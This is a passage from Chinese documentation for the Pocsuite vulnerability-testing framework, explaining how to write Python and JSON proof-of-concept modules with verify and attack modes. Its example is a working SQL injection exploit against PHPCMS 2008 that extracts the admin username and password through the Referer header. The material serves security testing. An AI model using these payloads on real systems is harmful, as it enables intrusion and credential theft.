<pre class="hljs cs"><code>    Pcs.Config&gt;url
    Pcs.config.url&gt;www.example.com
    Pcs.Config&gt;show
    +---------+-----------------+
    |  config |      <span class="hljs-keyword">value</span>      |
    +---------+-----------------+
    |   url   | www.example.com |
    | threads |        <span class="hljs-number">1</span>        |
    +---------+-----------------+

或

    Pcs.Config&gt;url example.com
    Pcs.Config&gt;show
    +---------+-------------+
    |  config |    <span class="hljs-keyword">value</span>    |
    +---------+-------------+
    |   url   | example.com |
    | threads |      <span class="hljs-number">1</span>      |
    +---------+-------------+
</code></pre><p>2、 进入 PoC 子视图，加载指定 PoC</p>
<pre class="hljs"><code>    Pcs&gt;poc
    Pcs.poc&gt;avaliable
    +-------+------------------+
    | pocId | avaliablePocName |
    +-------+------------------+
    |   1   | _poc_example1.py |
    |   2   | poc_example1.py  |
    +-------+------------------+

    Pcs.poc&gt;load 1
    [*] load poc file(s) success!

    Pcs.poc&gt;q
</code></pre><p>3、 Verify/Attack</p>
<pre class="hljs coffeescript"><code>    Pcs&gt;verify
    [<span class="hljs-number">15</span>:<span class="hljs-number">13</span>:<span class="hljs-number">26</span>] [*] starting <span class="hljs-number">1</span> threads
    [<span class="hljs-number">15</span>:<span class="hljs-number">13</span>:<span class="hljs-number">26</span>] [*] <span class="hljs-attribute">poc</span>:<span class="hljs-string">'_poc_example1'</span> <span class="hljs-attribute">target</span>:<span class="hljs-string">'www.example.com'</span>
</code></pre><h5 id="-poc-a-id-report-a-"><strong>PoC 测试报告自动生成</strong> <a id="report"></a></h5>
<p>Pocsuite 默认只会将执行结果输出显示在屏幕上，如需将结果自动生成报告并保存，在扫描参数后加 <code>--report [report_file]</code> 即可生成 html格式报告。</p>
<pre class="hljs sql"><code>    $ python pocsuite.py -r tests/poc_example2.py -u example.com <span class="hljs-comment">--verify --report /tmp/report.html</span>
</code></pre><p>上述命令执行后，会调用 <code>poc_example2.py</code> 并将结果保存到 <code>/tmp/report.html</code> 中。</p>
<h4 id="-poc-a-id-write_poc-a-">编写 PoC <a id="write_poc"></a></h4>
<p>Pocsuite 是一个 Python 开发的 PoC 框架, 支持 Python 和 Json 两种 PoC 编写方式．</p>
<h4 id="python-poc-a-id-python_coding-a-">Python PoC 编写规范<a id="python_coding"></a></h4>
<blockquote>
<p>特别注意：编写的代码要尽可能符合 PEP8 规范，严格规范 4 个空格为缩进！相关规范可以参考 <a href="http://blog.knownsec.com/Knownsec_RD_Checklist/PythonCodingRule.pdf">PythonCodingRule</a>。</p>
</blockquote>
<p>1、 新建 .py 文件，导入相关模块，新建继承框架的基础类 <code>TestPOC(POCBase)</code></p>
<pre class="hljs python"><code>    <span class="hljs-comment">#!/usr/bin/env python</span>
    <span class="hljs-comment"># coding: utf-8</span>

    <span class="hljs-keyword">from</span> pocsuite.net <span class="hljs-keyword">import</span> req
    <span class="hljs-keyword">from</span> pocsuite.poc <span class="hljs-keyword">import</span> POCBase, Output
    <span class="hljs-keyword">from</span> pocsuite.utils <span class="hljs-keyword">import</span> register


    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestPOC</span><span class="hljs-params">(POCBase)</span>:</span>
        ...
</code></pre><p>2、 填写 PoC 信息字段,<strong><code>所有信息都要认真填写不然不会过审核的</code></strong></p>
<pre class="hljs python"><code>    vulID = <span class="hljs-string">'1571'</span>  <span class="hljs-comment"># VUL ID</span>
    version = <span class="hljs-string">'1'</span> <span class="hljs-comment">#默认为1</span>
    author = <span class="hljs-string">'zhengdt'</span> <span class="hljs-comment"># PoC 作者的大名</span>
    vulDate = <span class="hljs-string">'2014-10-16'</span> <span class="hljs-comment">#漏洞公开的时间,不知道就写今天</span>
    createDate = <span class="hljs-string">'2014-10-16'</span><span class="hljs-comment"># 编写 PoC 的日期</span>
    updateDate = <span class="hljs-string">'2014-10-16'</span><span class="hljs-comment">#POC更新的时间,默认和编写时间一样</span>
    references = [<span class="hljs-string">'https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html'</span>]<span class="hljs-comment"># 漏洞地址来源,0day 不用写</span>
    name = <span class="hljs-string">'Drupal 7.x /includes/database/database.inc SQL注入漏洞 POC'</span><span class="hljs-comment"># PoC 名称</span>
    appPowerLink = <span class="hljs-string">'https://www.drupal.org/'</span><span class="hljs-comment"># 漏洞厂商主页地址</span>
    appName = <span class="hljs-string">'Drupal'</span><span class="hljs-comment"># 漏洞应用名称</span>
    appVersion = <span class="hljs-string">'7.x'</span><span class="hljs-comment"># 漏洞影响版本</span>
    vulType = <span class="hljs-string">'SQL Injection'</span><span class="hljs-comment">#漏洞类型,类型参考见 漏洞类型规范表</span>
    desc = <span class="hljs-string">'''
        Drupal 在处理 IN 语句时，展开数组时 key 带入 SQL 语句导致 SQL 注入，
        可以添加管理员、造成信息泄露。
    '''</span> <span class="hljs-comment"># 漏洞简要描述</span>
    samples = []<span class="hljs-comment"># 测试样例,就是用 PoC 测试成功的网站，选填</span>
</code></pre><p>3、 编写 Verify 模式：</p>
<p>Verify 模式即为单纯的验证目标网站是否有漏洞，不对目标进行任何修改，删除等有危害的行为。在 Pocsuite 中用户需要定义 <code>_verify</code> 函数，定义方式如下：</p>
<pre class="hljs python"><code>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_verify</span><span class="hljs-params">(self)</span>:</span>
        output = Output(self)
        result = {} <span class="hljs-comment">#result是返回结果</span>
        <span class="hljs-comment"># 验证代码</span>
</code></pre><p>验证成功后需要把验证结果赋值给 result 变量。result 里的 key 必须按照下面规范填写</p>
<pre class="hljs coffeescript"><code>    <span class="hljs-string">'Result'</span>:{
       <span class="hljs-string">'DBInfo'</span> :   {<span class="hljs-string">'Username'</span>: <span class="hljs-string">'xxx'</span>, <span class="hljs-string">'Password'</span>: <span class="hljs-string">'xxx'</span>, <span class="hljs-string">'Salt'</span>: <span class="hljs-string">'xxx'</span> , <span class="hljs-string">'Uid'</span>:<span class="hljs-string">'xxx'</span> , <span class="hljs-string">'Groupid'</span>:<span class="hljs-string">'xxx'</span>},
       <span class="hljs-string">'ShellInfo'</span>: {<span class="hljs-string">'URL'</span>: <span class="hljs-string">'xxx'</span>, <span class="hljs-string">'Content'</span>: <span class="hljs-string">'xxx'</span> },
       <span class="hljs-string">'FileInfo'</span>:  {<span class="hljs-string">'Filename'</span>:<span class="hljs-string">'xxx'</span>,<span class="hljs-string">'Content'</span>:<span class="hljs-string">'xxx'</span>},
       <span class="hljs-string">'XSSInfo'</span>:   {<span class="hljs-string">'URL'</span>:<span class="hljs-string">'xxx'</span>,<span class="hljs-string">'Payload'</span>:<span class="hljs-string">'xxx'</span>},
       <span class="hljs-string">'AdminInfo'</span>: {<span class="hljs-string">'Uid'</span>:<span class="hljs-string">'xxx'</span> , <span class="hljs-string">'Username'</span>:<span class="hljs-string">'xxx'</span> , <span class="hljs-string">'Password'</span>:<span class="hljs-string">'xxx'</span> }
       <span class="hljs-string">'Database'</span>:  {<span class="hljs-string">'Hostname'</span>:<span class="hljs-string">'xxx'</span>, <span class="hljs-string">'Username'</span>:<span class="hljs-string">'xxx'</span>,  <span class="hljs-string">'Password'</span>:<span class="hljs-string">'xxx'</span>, <span class="hljs-string">'DBname'</span>:<span class="hljs-string">'xxx'</span>},
       <span class="hljs-string">'VerifyInfo'</span>:{<span class="hljs-string">'URL'</span>: <span class="hljs-string">'xxx'</span> , <span class="hljs-string">'Postdata'</span>:<span class="hljs-string">'xxx'</span> , <span class="hljs-string">'Path'</span>:<span class="hljs-string">'xxx'</span>}
       <span class="hljs-string">'SiteAttr'</span>:  {<span class="hljs-string">'Process'</span>:<span class="hljs-string">'xxx'</span>}
    }
</code></pre><p> Example:</p>
<pre class="hljs ruby"><code>  <span class="hljs-keyword">if</span> <span class="hljs-symbol">keywords:</span>
      result[<span class="hljs-string">'VerifyInfo'</span>] = {}
      result[<span class="hljs-string">'VerifyInfo'</span>][<span class="hljs-string">'URL'</span>] = <span class="hljs-keyword">self</span>.url + payload
</code></pre><p>result 每个 key 值相对应的意义：</p>
<pre class="hljs cs"><code>    correspond：[

    {  name: <span class="hljs-string">'DBInfo'</span>,        <span class="hljs-keyword">value</span>：<span class="hljs-string">'数据库内容'</span> },
        {  name: <span class="hljs-string">'Username'</span>,      <span class="hljs-keyword">value</span>: <span class="hljs-string">'管理员用户名'</span>},
        {  name: <span class="hljs-string">'Password'</span>,      <span class="hljs-keyword">value</span>：<span class="hljs-string">'管理员密码'</span> },
        {  name: <span class="hljs-string">'Salt'</span>,          <span class="hljs-keyword">value</span>: <span class="hljs-string">'加密盐值'</span>},
        {  name: <span class="hljs-string">'Uid'</span>,           <span class="hljs-keyword">value</span>: <span class="hljs-string">'用户ID'</span>},
        {  name: <span class="hljs-string">'Groupid'</span>,       <span class="hljs-keyword">value</span>: <span class="hljs-string">'用户组ID'</span>},

    {  name: <span class="hljs-string">'ShellInfo'</span>,     <span class="hljs-keyword">value</span>: <span class="hljs-string">'Webshell信息'</span>},
        {  name: <span class="hljs-string">'URL'</span>,           <span class="hljs-keyword">value</span>: <span class="hljs-string">'Webshell地址'</span>},
        {  name: <span class="hljs-string">'Content'</span>,       <span class="hljs-keyword">value</span>: <span class="hljs-string">'Webshell内容'</span>},

    {  name: <span class="hljs-string">'FileInfo'</span>,      <span class="hljs-keyword">value</span>: <span class="hljs-string">'文件信息'</span>},
        {  name: <span class="hljs-string">'Filename'</span>,      <span class="hljs-keyword">value</span>: <span class="hljs-string">'文件名称'</span>},
        {  name: <span class="hljs-string">'Content'</span>,       <span class="hljs-keyword">value</span>: <span class="hljs-string">'文件内容'</span>},

    {  name: <span class="hljs-string">'XSSInfo'</span>,       <span class="hljs-keyword">value</span>: <span class="hljs-string">'跨站脚本信息'</span>},
        {  name: <span class="hljs-string">'URL'</span>,           <span class="hljs-keyword">value</span>: <span class="hljs-string">'验证URL'</span>},
        {  name: <span class="hljs-string">'Payload'</span>,       <span class="hljs-keyword">value</span>: <span class="hljs-string">'验证Payload'</span>},

    {  name: <span class="hljs-string">'AdminInfo'</span>,     <span class="hljs-keyword">value</span>: <span class="hljs-string">'管理员信息'</span>},
        {  name: <span class="hljs-string">'Uid'</span>,           <span class="hljs-keyword">value</span>: <span class="hljs-string">'管理员ID'</span>},
        {  name: <span class="hljs-string">'Username'</span>,      <span class="hljs-keyword">value</span>: <span class="hljs-string">'管理员用户名'</span>},
        {  name: <span class="hljs-string">'Password'</span>,      <span class="hljs-keyword">value</span>: <span class="hljs-string">'管理员密码'</span>},

    {  name: <span class="hljs-string">'Database'</span>,      <span class="hljs-keyword">value</span>：<span class="hljs-string">'数据库信息'</span> },
        {  name: <span class="hljs-string">'Hostname'</span>,      <span class="hljs-keyword">value</span>: <span class="hljs-string">'数据库主机名'</span>},
        {  name: <span class="hljs-string">'Username'</span>,      <span class="hljs-keyword">value</span>：<span class="hljs-string">'数据库用户名'</span> },
        {  name: <span class="hljs-string">'Password'</span>,      <span class="hljs-keyword">value</span>: <span class="hljs-string">'数据库密码'</span>},
        {  name: <span class="hljs-string">'DBname'</span>,        <span class="hljs-keyword">value</span>: <span class="hljs-string">'数据库名'</span>},

    {  name: <span class="hljs-string">'VerifyInfo'</span>,    <span class="hljs-keyword">value</span>: <span class="hljs-string">'验证信息'</span>},
        {  name: <span class="hljs-string">'URL'</span>,           <span class="hljs-keyword">value</span>: <span class="hljs-string">'验证URL'</span>},
        {  name: <span class="hljs-string">'Postdata'</span>,      <span class="hljs-keyword">value</span>: <span class="hljs-string">'验证POST数据'</span>},
        {  name: <span class="hljs-string">'Path'</span>,          <span class="hljs-keyword">value</span>: <span class="hljs-string">'网站绝对路径'</span>},

    {  name: <span class="hljs-string">'SiteAttr'</span>,      <span class="hljs-keyword">value</span>: <span class="hljs-string">'网站服务器信息'</span>},
    {  name: <span class="hljs-string">'Process'</span>,       <span class="hljs-keyword">value</span>: <span class="hljs-string">'服务器进程'</span>}

    ]
</code></pre><p>4、 编写 Attack 模式：</p>
<p>Attack 模式可以对目标进行 get shell ，查询管理员帐号密码等操作.定义它的方法与 Verify 模式类似</p>
<pre class="hljs python"><code>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_attack</span><span class="hljs-params">(self)</span>:</span>
        output = Output(self)
        result = {}
        <span class="hljs-comment"># 攻击代码</span>
</code></pre><p>和 Verify 模式一样，攻击成功后需要把攻击得到结果赋值给 result 变量。</p>
<p> <strong>注意：如果该 PoC 没有 Attack 模式，可以在 _attack() 函数下加入一句 return self._verify() 这样你就无需再写 _attack() 函数了。</strong></p>
<p>5、 注册 PoC 实现类</p>
<p>在类的外部调用 <code>register()</code> 方法注册 PoC 类</p>
<pre class="hljs nginx"><code>    <span class="hljs-title">Class</span> TestPOC(POCBase):
        <span class="hljs-comment">#POC内部代码</span>

    <span class="hljs-comment">#注册TestPOC类</span>
    register(TestPOC)
</code></pre><h5 id="-json-poc-a-id-json_coding-a-"><strong>Json PoC 编写</strong><a id="json_coding"></a></h5>
<p>1、 首先新建一个 .json 文件,文件名应当符合 <strong>PoC 命名规范</strong></p>
<p>2、 Json PoC 有两个 key，<code>pocInfo</code> 和 <code>pocExecute</code>，分别代表 PoC 信息部分执行体。</p>
<pre class="hljs json"><code>{
    "<span class="hljs-attribute">pocInfo</span>":<span class="hljs-value">{}</span>,
    "<span class="hljs-attribute">pocExecute</span>":<span class="hljs-value">{}
</span>}
</code></pre><p>3、 填写 pocInfo 部分：</p>
<pre class="hljs json"><code>{
    "<span class="hljs-attribute">pocInfo</span>":<span class="hljs-value">{
        "<span class="hljs-attribute">vulID</span>": <span class="hljs-value"><span class="hljs-string">"poc-2015-0107"</span></span>,
        "<span class="hljs-attribute">name</span>": <span class="hljs-value"><span class="hljs-string">"Openssl 1.0.1 内存读取 信息泄露漏洞"</span></span>,
        "<span class="hljs-attribute">protocol</span>": <span class="hljs-value"><span class="hljs-string">"http"</span></span>,
        "<span class="hljs-attribute">author</span>": <span class="hljs-value"><span class="hljs-string">"test"</span></span>,
        "<span class="hljs-attribute">references</span>": <span class="hljs-value">[<span class="hljs-string">"http://drops.wooyun.org/papers/1381"</span>]</span>,
        "<span class="hljs-attribute">appName</span>": <span class="hljs-value"><span class="hljs-string">"OpenSSL"</span></span>,
        "<span class="hljs-attribute">appVersion</span>" : <span class="hljs-value"><span class="hljs-string">"1.0.1~1.0.1f, 1.0.2-beta, 1.0.2-beta1"</span></span>,
        "<span class="hljs-attribute">vulType</span>": <span class="hljs-value"><span class="hljs-string">"Information Disclosure"</span></span>,
        "<span class="hljs-attribute">desc</span>" :<span class="hljs-value"><span class="hljs-string">"OpenSSL是一个强大的安全套接字层密码库。这次漏洞被称为OpenSSL“心脏出血”漏洞，这是关于 OpenSSL 的信息泄漏漏洞导致的安全问题。它使攻击者能够从内存中读取最多64 KB的数据。安全人员表示：无需任何特权信息或身份验证，我们就可以从我们自己的（测试机上）偷来X.509证书的私钥、用户名与密码、聊天工具的消息、电子邮件以及重要的商业文档和通信等数据."</span></span>,
        "<span class="hljs-attribute">samples</span>": <span class="hljs-value">[<span class="hljs-string">"http://www.baidu.com"</span>, <span class="hljs-string">"http://www.qq.com"</span>]
    </span>}</span>,
    "<span class="hljs-attribute">pocExecute</span>":<span class="hljs-value">{}
</span>}
</code></pre><p>各字段的含义与 Python PoC 属性部分相同。</p>
<p>4、 填写 pocExecute 部分：
pocExecute 分为 verify 和 attack 两部分</p>
<pre class="hljs json"><code>{
    "<span class="hljs-attribute">pocInfo</span>":<span class="hljs-value">{}</span>,
    "<span class="hljs-attribute">pocExecute</span>":<span class="hljs-value">{
        "<span class="hljs-attribute">verify</span>":<span class="hljs-value">[]</span>,
        "<span class="hljs-attribute">attack</span>":<span class="hljs-value">[]
    </span>}
</span>}
</code></pre><p>填写verify部分:</p>
<pre class="hljs json"><code>{
    "<span class="hljs-attribute">pocInfo</span>":<span class="hljs-value">{}</span>,
    "<span class="hljs-attribute">pocExecute</span>":<span class="hljs-value">{
        "<span class="hljs-attribute">verify</span>":<span class="hljs-value">[
            {
                "<span class="hljs-attribute">step</span>": <span class="hljs-value"><span class="hljs-string">"1"</span></span>,
                "<span class="hljs-attribute">method</span>": <span class="hljs-value"><span class="hljs-string">"get"</span></span>,
                "<span class="hljs-attribute">vulPath</span>": <span class="hljs-value"><span class="hljs-string">"/api.php"</span></span>,
                "<span class="hljs-attribute">params</span>": <span class="hljs-value"><span class="hljs-string">"test=123&amp;sebug=1234"</span></span>,
                "<span class="hljs-attribute">necessary</span>": <span class="hljs-value"><span class="hljs-string">""</span></span>,
                "<span class="hljs-attribute">headers</span>": <span class="hljs-value">{"<span class="hljs-attribute">cookie</span>": <span class="hljs-value"><span class="hljs-string">"123"</span></span>}</span>,
                "<span class="hljs-attribute">status</span>":<span class="hljs-value"><span class="hljs-string">"200"</span></span>,
                "<span class="hljs-attribute">match</span>": <span class="hljs-value">{
                    "<span class="hljs-attribute">regex</span>": <span class="hljs-value">[<span class="hljs-string">"baidu"</span>,<span class="hljs-string">"google"</span>]</span>,
                    "<span class="hljs-attribute">time</span>": <span class="hljs-value"><span class="hljs-string">"time"</span>
                </span>}
            </span>},
            {
                "<span class="hljs-attribute">step</span>": <span class="hljs-value"><span class="hljs-string">"2"</span></span>,
                "<span class="hljs-attribute">method</span>": <span class="hljs-value"><span class="hljs-string">"get"</span></span>,
                "<span class="hljs-attribute">vulPath</span>": <span class="hljs-value"><span class="hljs-string">"/api.php"</span></span>,
                "<span class="hljs-attribute">params</span>": <span class="hljs-value"><span class="hljs-string">"test=sebug"</span></span>,
                "<span class="hljs-attribute">necessary</span>": <span class="hljs-value"><span class="hljs-string">""</span></span>,
                "<span class="hljs-attribute">headers</span>": <span class="hljs-value"><span class="hljs-string">""</span></span>,
                "<span class="hljs-attribute">status</span>": <span class="hljs-value"><span class="hljs-string">"200"</span></span>,
                "<span class="hljs-attribute">match</span>":<span class="hljs-value">{
                    "<span class="hljs-attribute">regex</span>": <span class="hljs-value">[<span class="hljs-string">"\d{0,3}"</span>]</span>,
                    "<span class="hljs-attribute">time</span>": <span class="hljs-value"><span class="hljs-string">"0.01"</span>
                </span>}
            </span>}
        ]</span>,
        "<span class="hljs-attribute">attack</span>":<span class="hljs-value">[]
    </span>}
</span>}
</code></pre><p>字段说明：</p>
<ul>
<li>step: 按照上下顺序执行，值可以取0和非0两种。如果 step 的值为 0,那么验证成功后就会返回成功，如果 step 的值不为 0,那么需要全部满足后才返回成功。</li>
<li>method：请求方式</li>
<li>vulPath：请求路径</li>
<li>params：请求参数</li>
<li>necessary：请求中必须存在的数据，例如 cookie</li>
<li>headers：自定义请求头部</li>
<li>status: 返回的 HTTP 状态码</li>
<li>match：返回体，其中：<ul>
<li>regex：表示字符串匹配，为数组类型，当且仅当 regex 中所有的元素都匹配成功的情况下，返回 True，否则返回 False.支持正则表达式</li>
<li>time：为时间差，当 raw 和 time 同时存在时，取raw，time 失效。</li>
</ul>
</li>
</ul>
<p><strong>verify 中每个元素代表一个请求。</strong></p>
<p>填写 Attack 部分:</p>
<pre class="hljs json"><code>{
    "<span class="hljs-attribute">pocInfo</span>":<span class="hljs-value">{}</span>,
    "<span class="hljs-attribute">pocExecute</span>":<span class="hljs-value">{
        "<span class="hljs-attribute">verify</span>":<span class="hljs-value">[]</span>,
        "<span class="hljs-attribute">attack</span>":<span class="hljs-value">[
            {
                "<span class="hljs-attribute">step</span>": <span class="hljs-value"><span class="hljs-string">"1"</span></span>,
                "<span class="hljs-attribute">method</span>": <span class="hljs-value"><span class="hljs-string">"get"</span></span>,
                "<span class="hljs-attribute">vulPath</span>": <span class="hljs-value"><span class="hljs-string">"/api.php"</span></span>,
                "<span class="hljs-attribute">params</span>": <span class="hljs-value"><span class="hljs-string">"test=123&amp;sebug=1234"</span></span>,
                "<span class="hljs-attribute">necessary</span>": <span class="hljs-value"><span class="hljs-string">""</span></span>,
                "<span class="hljs-attribute">headers</span>": <span class="hljs-value">{"<span class="hljs-attribute">cookie</span>": <span class="hljs-value"><span class="hljs-string">"123"</span></span>}</span>,
                "<span class="hljs-attribute">status</span>":<span class="hljs-value"><span class="hljs-string">"200"</span></span>,
                "<span class="hljs-attribute">match</span>": <span class="hljs-value">{
                    "<span class="hljs-attribute">regex</span>": <span class="hljs-value">[<span class="hljs-string">"baidu"</span>,<span class="hljs-string">"google"</span>]</span>,
                    "<span class="hljs-attribute">time</span>": <span class="hljs-value"><span class="hljs-string">"time"</span>
                </span>}</span>,
                "<span class="hljs-attribute">result</span>":<span class="hljs-value">{
                  "<span class="hljs-attribute">AdminInfo</span>":<span class="hljs-value">{
                    "<span class="hljs-attribute">Password</span>":<span class="hljs-value"><span class="hljs-string">"&lt;regex&gt;www(.+)com"</span>
                  </span>}
                </span>}
            </span>}
        ]
    </span>}
</span>}
</code></pre><p>attack部分和verify部分类似，比verify 部分多一个 "result".</p>
<ul>
<li>"result": 为输出，其类型为 dict</li>
<li>"AdminInfo": 是管理员信息，此项见 <a href="#resultstandard">Result 说明</a></li>
<li>"Password": 是result中 AdminInfo 中的字段，其值支持正则表达式，如果需要使用正则表达式来获取页面信息，则需要在表达式字符串前加<code>&lt;regex&gt;</code></li>
</ul>
<h4 id="poc-a-id-pocexample-a-">PoC 代码示例<a id="pocexample"></a></h4>
<h4 id="poc-py-a-id-pyexample-a-">PoC py代码示例<a id="pyexample"></a></h4>
<p><a href="http://www.seebug.org/vuldb/ssvid-62274">phpcms<em>2008</em>/ads/include/ads_place.class.php_sql注入漏洞</a> PoC:</p>
<pre class="hljs python"><code><span class="hljs-comment">#!/usr/bin/env python</span>
<span class="hljs-comment"># coding: utf-8</span>
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">import</span> urlparse
<span class="hljs-keyword">from</span> pocsuite.net <span class="hljs-keyword">import</span> req
<span class="hljs-keyword">from</span> pocsuite.poc <span class="hljs-keyword">import</span> POCBase, Output
<span class="hljs-keyword">from</span> pocsuite.utils <span class="hljs-keyword">import</span> register


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestPOC</span><span class="hljs-params">(POCBase)</span>:</span>
    vulID = <span class="hljs-string">'62274'</span>  <span class="hljs-comment"># ssvid</span>
    version = <span class="hljs-string">'1'</span>
    author = [<span class="hljs-string">'Medici.Yan'</span>]
    vulDate = <span class="hljs-string">'2011-11-21'</span>
    createDate = <span class="hljs-string">'2015-09-23'</span>
    updateDate = <span class="hljs-string">'2015-09-23'</span>
    references = [<span class="hljs-string">'http://www.seebug.org/vuldb/ssvid-62274'</span>]
    name = <span class="hljs-string">'_62274_phpcms_2008_place_sql_inj_PoC'</span>
    appPowerLink = <span class="hljs-string">'http://www.phpcms.cn'</span>
    appName = <span class="hljs-string">'PHPCMS'</span>
    appVersion = <span class="hljs-string">'2008'</span>
    vulType = <span class="hljs-string">'SQL Injection'</span>
    desc = <span class="hljs-string">'''
        phpcms 2008 中广告模块，存在参数过滤不严，
        导致了sql注入漏洞，如果对方服务器开启了错误显示，可直接利用，
        如果关闭了错误显示，可以采用基于时间和错误的盲注
    '''</span>
    samples = [<span class="hljs-string">'http://10.1.200.28/'</span>]

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_attack</span><span class="hljs-params">(self)</span>:</span>
        result = {}
        vulurl = urlparse.urljoin(self.url, <span class="hljs-string">'/data/js.php?id=1'</span>)
        payload = <span class="hljs-string">"1', (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),(SELECT concat(char(45,45),username,char(45,45,45),password,char(45,45)) from phpcms_member limit 1))a from information_schema.tables group by a)b), '0')#"</span>
        head = {
            <span class="hljs-string">'Referer'</span>: payload
        }
        resp = req.get(vulurl, headers=head)
        <span class="hljs-keyword">if</span> resp.status_code == <span class="hljs-number">200</span>:
            match_result = re.search(<span class="hljs-string">r'Duplicate entry \'1--(.+)---(.+)--\' for key'</span>, resp.content, re.I | re.M)
            <span class="hljs-keyword">if</span> match_result:
                result[<span class="hljs-string">'AdminInfo'</span>] = {}
                result[<span class="hljs-string">'AdminInfo'</span>][<span class="hljs-string">'Username'</span>] = match_result.group(<span class="hljs-number">1</span>)
                result[<span class="hljs-string">'AdminInfo'</span>][<span class="hljs-string">'Password'</span>] = match_result.group(<span class="hljs-number">2</span>)
        <span class="hljs-keyword">return</span> self.parse_attack(result)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_verify</span><span class="hljs-params">(self)</span>:</span>
        result = {}
        vulurl = urlparse.urljoin(self.url, <span class="hljs-string">'/data/js.php?id=1'</span>)
        payload = <span class="hljs-string">"1', (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2), md5(1))a from information_schema.tables group by a)b), '0')#"</span>
        head = {
            <span class="hljs-string">'Referer'</span>: payload
        }
        resp = req.get(vulurl, headers=head)
        <span class="hljs-keyword">if</span> resp.status_code == <span class="hljs-number">200</span> <span class="hljs-keyword">and</span> <span class="hljs-string">'c4ca4238a0b923820dcc509a6f75849b'</span> <span class="hljs-keyword">in</span> resp.content:
            result[<span class="hljs-string">'VerifyInfo'</span>] = {}
            result[<span class="hljs-string">'VerifyInfo'</span>][<span class="hljs-string">'URL'</span>] = vulurl
            result[<span class="hljs-string">'VerifyInfo'</span>][<span class="hljs-string">'Payload'</span>] = payload

        <span class="hljs-keyword">return</span> self.parse_attack(result)

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_attack</span><span class="hljs-params">(self, result)</span>:</span>
        output = Output(self)
        <span class="hljs-keyword">if</span> result:
            output.success(result)
        <span class="hljs-keyword">else</span>:
            output.fail(<span class="hljs-string">'Internet nothing returned'</span>)
        <span class="hljs-keyword">return</span> output


register(TestPOC)
</code></pre><h4 id="poc-json-a-id-jsonexample-a-">PoC json 代码示例<a id="jsonexample"></a></h4>
<p><a href="http://www.seebug.org/vuldb/ssvid-62274">phpcms<em>2008</em>/ads/include/ads_place.class.php_sql注入漏洞</a> PoC:</p>
<p>由于json不支持注释,所以具体字段意义请参考上文，涉及到的靶场请自行根据Seebug漏洞详情搭建。</p>
<pre class="hljs json"><code>{
    "<span class="hljs-attribute">pocInfo</span>": <span class="hljs-value">{
        "<span class="hljs-attribute">vulID</span>": <span class="hljs-value"><span class="hljs-string">"62274"</span></span>,
        "<span class="hljs-attribute">version</span>":<span class="hljs-value"><span class="hljs-string">"1"</span></span>,
        "<span class="hljs-attribute">vulDate</span>":<span class="hljs-value"><span class="hljs-string">"2011-11-21"</span></span>,
        "<span class="hljs-attribute">createDate</span>":<span class="hljs-value"><span class="hljs-string">"2015-09-15"</span></span>,
        "<span class="hljs-attribute">updateDate</span>":<span class="hljs-value"><span class="hljs-string">"2015-09-15"</span></span>,
        "<span class="hljs-attribute">name</span>": <span class="hljs-value"><span class="hljs-string">"phpcms_2008_ads_place.class.php_sql-inj"</span></span>,
        "<span class="hljs-attribute">protocol</span>": <span class="hljs-value"><span class="hljs-string">"http"</span></span>,
        "<span class="hljs-attribute">vulType</span>": <span class="hljs-value"><span class="hljs-string">"SQL Injection"</span></span>,
        "<span class="hljs-attribute">author</span>": <span class="hljs-value"><span class="hljs-string">"Medici.Yan"</span></span>,
        "<span class="hljs-attribute">references</span>": <span class="hljs-value">[<span class="hljs-string">"http://www.seebug.org/vuldb/ssvid-62274"</span>]</span>,
        "<span class="hljs-attribute">appName</span>": <span class="hljs-value"><span class="hljs-string">"phpcms"</span></span>,
        "<span class="hljs-attribute">appVersion</span>" : <span class="hljs-value"><span class="hljs-string">"2008"</span></span>,
        "<span class="hljs-attribute">appPowerLink</span>":<span class="hljs-value"><span class="hljs-string">"http://www.phpcms.cn"</span></span>,
        "<span class="hljs-attribute">desc</span>" :<span class="hljs-value"><span class="hljs-string">"phpcms 2008 中广告模块，存在参数过滤不严，导致了sql注入漏洞，如果对方服务器开启了错误显示，可直接利用，如果关闭了错误显示，可以采用基于时间和错误的盲注"</span></span>,
        "<span class="hljs-attribute">samples</span>": <span class="hljs-value">[<span class="hljs-string">"http://127.0.0.1"</span>]
    </span>}</span>,

    "<span class="hljs-attribute">pocExecute</span>":<span class="hljs-value">{
        "<span class="hljs-attribute">verify</span>": <span class="hljs-value">[
            {
                "<span class="hljs-attribute">step</span>": <span class="hljs-value"><span class="hljs-string">"0"</span></span>,
                "<span class="hljs-attribute">method</span>": <span class="hljs-value"><span class="hljs-string">"get"</span></span>,
                "<span class="hljs-attribute">vulPath</span>": <span class="hljs-value"><span class="hljs-string">"/data/js.php"</span></span>,
                "<span class="hljs-attribute">params</span>": <span class="hljs-value"><span class="hljs-string">"id=1"</span></span>,
                "<span class="hljs-attribute">necessary</span>": <span class="hljs-value"><span class="hljs-string">""</span></span>,
                "<span class="hljs-attribute">headers</span>": <span class="hljs-value">{"<span class="hljs-attribute">Referer</span>":<span class="hljs-value"><span class="hljs-string">"1', (SELECT 1 FROM (select count(*),concat(floor(rand(0)*2),char(45,45,45),(SELECT md5(1)))a from information_schema.tables group by a)b), '0')#"</span></span>}</span>,
                "<span class="hljs-attribute">status</span>": <span class="hljs-value"><span class="hljs-string">"200"</span></span>,
                "<span class="hljs-attribute">match</span>": <span class="hljs-value">{
                    "<span class="hljs-attribute">regex</span>": <span class="hljs-value">[<span class="hljs-string">"c4ca4238a0b923820dcc509a6f75849b"</span>]</span>,
                    "<span class="hljs-attribute">time</span>":<span class="hljs-value"><span class="hljs-string">""</span>
                </span>}
            </span>}
        ]</span>,
        "<span class="hljs-attribute">attack</span>": <span class="hljs-value">[
            {
                "<span class="hljs-attribute">step</span>": <span class="hljs-value"><span class="hljs-string">"0"</span></span>,
                "<span class="hljs-attribute">method</span>": <span class="hljs-value"><span class="hljs-string">"get"</span></span>,
